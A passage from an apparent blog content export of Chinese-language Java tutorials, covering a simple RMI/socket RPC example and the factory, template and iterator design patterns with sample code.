class="params">(String school)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.school = school;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Server server = <span class="keyword">new</span> Server(<span class="number">12000</span>);</span><br><span class="line">				server.start();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">				System.out.println(e.getMessage());</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;).start();</span><br><span class="line"></span><br><span class="line">		SocketClientProxy proxy = <span class="keyword">new</span> SocketClientProxy();</span><br><span class="line">		StudentService studentService = proxy.getProxy(StudentService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		Student student = studentService.getInfo();</span><br><span class="line">		System.out.println(student.getName());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="RMI实现简易RPC"><a href="#RMI实现简易RPC" class="headerlink" title="RMI实现简易RPC"></a>RMI实现简易RPC</h2><p>定义RMI对外服务接口HelloService</p>
<h4 id="HelloService"><a href="#HelloService" class="headerlink" title="HelloService"></a>HelloService</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">sayHello</span><span class="params">(String someone)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMI接口方法定义必须显式声明抛出RemoteException异常</p>
<h4 id="HelloServiceImpl"><a href="#HelloServiceImpl" class="headerlink" title="HelloServiceImpl"></a>HelloServiceImpl</h4><p>服务端接口实现HelloServiceImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String someone)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Hello "</span> + someone;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端方法实现必须继承UnicastRemoteObject类，该类定义了服务调用方法与服务提供方对象实例，并建立一对一连接。</p>
<h4 id="ServerMain"><a href="#ServerMain" class="headerlink" title="ServerMain"></a>ServerMain</h4><p>服务端RMI服务启动代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerMain</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		HelloService helloService = <span class="keyword">new</span> HelloServiceImpl();</span><br><span class="line">		LocateRegistry.createRegistry(<span class="number">12000</span>);</span><br><span class="line">		Naming.bind(<span class="string">"rmi://localhost:12000/helloService"</span>, helloService);</span><br><span class="line">		System.out.println(<span class="string">"Server main provide RPC service now."</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ClientMain"><a href="#ClientMain" class="headerlink" title="ClientMain"></a>ClientMain</h4><p>客户端远程调用RMI服务代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientMain</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		HelloService helloService = (HelloService) Naming.lookup(<span class="string">"rmi://localhost:12000/helloService"</span>);</span><br><span class="line">		System.out.println(<span class="string">"RMI 服务器返回的结果是："</span> + helloService.sayHello(<span class="string">"haha"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>RPC</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-工厂模式</title>
    <url>/2020/04/08/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在工厂模式（Factory Pattern）中，父类决定实例的生成方式，但不决定所要生成的具体的类，具体的处理全部交给子类负责。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-factory1.png" alt="工厂模式类图"></p>
<h3 id="Product（产品）"><a href="#Product（产品）" class="headerlink" title="Product（产品）"></a>Product（产品）</h3><p>Product角色属于框架，是一个抽象类。它定义了在工厂模式中生产的那些实例是持有的接口，但具体的处理则由子类ConcreteProduct角色决定</p>
<h3 id="Creator（创建者）"><a href="#Creator（创建者）" class="headerlink" title="Creator（创建者）"></a>Creator（创建者）</h3><p>它是负责生成Product角色的抽象类，但具体的处理则由子类ConcreteCreator角色决定。</p>
<p>Creator对于实际负责生成实例的ConcreteCreator角色一无所知，它唯一知道的是，只要调用Product角色和生成实例的方法，就可以生成Product的实例。<strong>不用new关键字来生成实例，而是调用生成实例的专用方法来生成实例，这样就可以防止父类与其他具体类耦合。</strong></p>
<h3 id="ConcreteProduct（具体的产品）"><a href="#ConcreteProduct（具体的产品）" class="headerlink" title="ConcreteProduct（具体的产品）"></a>ConcreteProduct（具体的产品）</h3><p>它决定了具体的产品</p>
<h3 id="ConcreteCreator（具体的创建者）"><a href="#ConcreteCreator（具体的创建者）" class="headerlink" title="ConcreteCreator（具体的创建者）"></a>ConcreteCreator（具体的创建者）</h3><p>负责生成具体的产品</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-factory2.png" alt="工厂模式示例类图"></p>
<h3 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">use</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Factory"><a href="#Factory" class="headerlink" title="Factory"></a>Factory</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Product <span class="title">create</span><span class="params">(String owner)</span> </span>&#123;</span><br><span class="line">		Product p = createProduct(owner);</span><br><span class="line">		registerProduct(p);</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> Product <span class="title">createProduct</span><span class="params">(String owner)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">registerProduct</span><span class="params">(Product product)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IDCard"><a href="#IDCard" class="headerlink" title="IDCard"></a>IDCard</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IDCard</span> <span class="keyword">extends</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String owner;</span><br><span class="line">	</span><br><span class="line">	IDCard(String owner) &#123;</span><br><span class="line">		System.out.println(<span class="string">"制作 "</span> + owner + <span class="string">" 的ID 卡。"</span>);</span><br><span class="line">		<span class="keyword">this</span>.owner = owner;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">use</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"使用 "</span> + owner + <span class="string">" 的ID卡。"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getOwner</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> owner;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IDCardFactory"><a href="#IDCardFactory" class="headerlink" title="IDCardFactory"></a>IDCardFactory</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class IDCardFactory extends Factory &#123;</span><br><span class="line">	private List&lt;String&gt; owners &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	protected Product createProduct(String owner) &#123;</span><br><span class="line">		return new IDCard(owner);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	protected void registerProduct(Product product) &#123;</span><br><span class="line">		owners.add(((IDCard)product).getOwner());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	public List&lt;String&gt; getOwners() &#123;</span><br><span class="line">		return owners;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Factory factory = <span class="keyword">new</span> IDCardFactory();</span><br><span class="line">		Product card1 = factory.create(<span class="string">"huhanyi"</span>);</span><br><span class="line">		Product card2 = factory.create(<span class="string">"huhaner"</span>);</span><br><span class="line">		Product card3 = factory.create(<span class="string">"huhansan"</span>);</span><br><span class="line">		card1.use();</span><br><span class="line">		card2.use();</span><br><span class="line">		card3.use();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>工厂模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-模板模式</title>
    <url>/2020/04/08/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h1><h2 id="模板定义"><a href="#模板定义" class="headerlink" title="模板定义"></a>模板定义</h2><p>在模板模式（Template Pattern）中，一个抽象类公开定义了执行它的方法的方式/模板。它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-template1.png" alt="模板模式类图"></p>
<h3 id="AbstractClass（抽象类）"><a href="#AbstractClass（抽象类）" class="headerlink" title="AbstractClass（抽象类）"></a>AbstractClass（抽象类）</h3><p>它不仅负责实现模板方法，还负责声明在模板方法中所使用到的抽象方法。这些抽象方法由子类ConcreteClass负责实现。</p>
<h3 id="ConcreteClass（具体类）"><a href="#ConcreteClass（具体类）" class="headerlink" title="ConcreteClass（具体类）"></a>ConcreteClass（具体类）</h3><p>它负责具体实现AbstractClass中定义的抽象方法。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="继承示例"><a href="#继承示例" class="headerlink" title="继承示例"></a>继承示例</h3><h4 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h4><p><img src="https://huhansi.github.io/images/2020-04-08-template2.png" alt="模板模式示例类图"></p>
<h4 id="AbstractDisplay"><a href="#AbstractDisplay" class="headerlink" title="AbstractDisplay"></a>AbstractDisplay</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractDisplay</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		open();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++) &#123;</span><br><span class="line">			print();</span><br><span class="line">		&#125;</span><br><span class="line">		close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CharDisplay"><a href="#CharDisplay" class="headerlink" title="CharDisplay"></a>CharDisplay</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharDisplay</span> <span class="keyword">extends</span> <span class="title">AbstractDisplay</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">char</span> ch;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">CharDisplay</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.ch = c;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"&lt;&lt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(ch);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"&gt;&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="StringDisplay"><a href="#StringDisplay" class="headerlink" title="StringDisplay"></a>StringDisplay</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringDisplay</span> <span class="keyword">extends</span> <span class="title">AbstractDisplay</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> String string;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> width;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">StringDisplay</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.string = string;</span><br><span class="line">		<span class="keyword">this</span>.width = string.length();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		printLine();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"|"</span> + string + <span class="string">"|"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		printLine();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printLine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.print(<span class="string">"+"</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; width;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"-"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"+"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		AbstractDisplay d1 = <span class="keyword">new</span> CharDisplay(<span class="string">'c'</span>);</span><br><span class="line">		AbstractDisplay d2 = <span class="keyword">new</span> StringDisplay(<span class="string">"Hello world."</span>);</span><br><span class="line">		AbstractDisplay d3 = <span class="keyword">new</span> StringDisplay(<span class="string">"你好，世界"</span>);</span><br><span class="line">		d1.display();</span><br><span class="line">		d2.display();</span><br><span class="line">		d3.display();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>模板模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-迭代器模式</title>
    <url>/2020/04/08/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>提供一种方法顺序访问一个聚合对象中的各个元素，而又无需暴露该对象的内部表示。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-iterator-pattern1.png" alt="迭代器模式"></p>
<h3 id="Iterator（迭代器）"><a href="#Iterator（迭代器）" class="headerlink" title="Iterator（迭代器）"></a>Iterator（迭代器）</h3><p>负责定义按顺序逐个遍历元素的接口（API）。它定义了hasNext和next两个方法。其中，hasNext用于判断是否存在下一个元素，next方法则用于获取该元素。</p>
<h3 id="ConcreteIterator（具体迭代器）"><a href="#ConcreteIterator（具体迭代器）" class="headerlink" title="ConcreteIterator（具体迭代器）"></a>ConcreteIterator（具体迭代器）</h3><p>它负责实现Iterator所定义的接口。</p>
<h3 id="Aggregate（集合）"><a href="#Aggregate（集合）" class="headerlink" title="Aggregate（集合）"></a>Aggregate（集合）</h3><p>它负责定义创建Iterator角色的接口。这个接口是一个方法，会创建出“按顺序访问保存在我内部元素的人”。</p>
<h3 id="ConcreteAggregate（具体的集合）"><a href="#ConcreteAggregate（具体的集合）" class="headerlink" title="ConcreteAggregate（具体的集合）"></a>ConcreteAggregate（具体的集合）</h3><p>负责实现Aggregate所定义的接口。它会创建出具体的Iterator角色，即ConcreteIterator角色。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="示例类图"><a href="#示例类图" class="headerlink" title="示例类图"></a>示例类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-iterator-pattern2.png" alt="示例类图"></p>
<h3 id="类和接口的一览表"><a href="#类和接口的一览表" class="headerlink" title="类和接口的一览表"></a>类和接口的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Aggregate</td>
<td>表示集合的接口</td>
</tr>
<tr>
<td>Iterator</td>
<td>遍历集合的接口</td>
</tr>
<tr>
<td>Book</td>
<td>表示书的类</td>
</tr>
<tr>
<td>BookShelf</td>
<td>表示书架的类</td>
</tr>
<tr>
<td>BookShelfIterator</td>
<td>遍历书架的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试类</td>
</tr>
</tbody></table>
<h3 id="Aggregate接口"><a href="#Aggregate接口" class="headerlink" title="Aggregate接口"></a>Aggregate接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Aggregate</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Iterator <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Iterator接口"><a href="#Iterator接口" class="headerlink" title="Iterator接口"></a>Iterator接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterator</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Object <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Book类"><a href="#Book类" class="headerlink" title="Book类"></a>Book类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Book</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BookShelf类"><a href="#BookShelf类" class="headerlink" title="BookShelf类"></a>BookShelf类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookShelf</span> <span class="keyword">implements</span> <span class="title">Aggregate</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;Book&gt; books;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">BookShelf</span><span class="params">(<span class="keyword">int</span> maxSize)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.books = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Book <span class="title">getBookAt</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> books.get(index);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">appendBook</span><span class="params">(Book book)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.books.add(book);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLength</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> books.size();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Iterator <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> BookShelfIterator(<span class="keyword">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BookShelfIterator类"><a href="#BookShelfIterator类" class="headerlink" title="BookShelfIterator类"></a>BookShelfIterator类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookShelfIterator</span> <span class="keyword">implements</span> <span class="title">Iterator</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> BookShelf bookShelf;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> index;</span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BookShelfIterator</span><span class="params">(BookShelf bookShelf)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">this</span>.bookShelf = bookShelf;</span><br><span class="line">    	<span class="keyword">this</span>.index = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> index &lt; bookShelf.getLength();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> bookShelf.getBookAt(index++);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		BookShelf bookShelf = <span class="keyword">new</span> BookShelf(<span class="number">10</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="number">10</span>;index++) &#123;</span><br><span class="line">			bookShelf.appendBook(<span class="keyword">new</span> Book(index + <span class="string">""</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		Iterator bIterator = bookShelf.iterator();</span><br><span class="line">		<span class="keyword">while</span>(bIterator.hasNext()) &#123;</span><br><span class="line">			Book book = (Book) bIterator.next();</span><br><span class="line">			System.out.println(book.getName());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为什么一定要考虑引入Iterator这种复杂的设计模式呢？如果是数组，直接使用for循环语句进行遍历处理不就可以了么？为什么要在集合之外引入Iterator这个角色呢？</p>
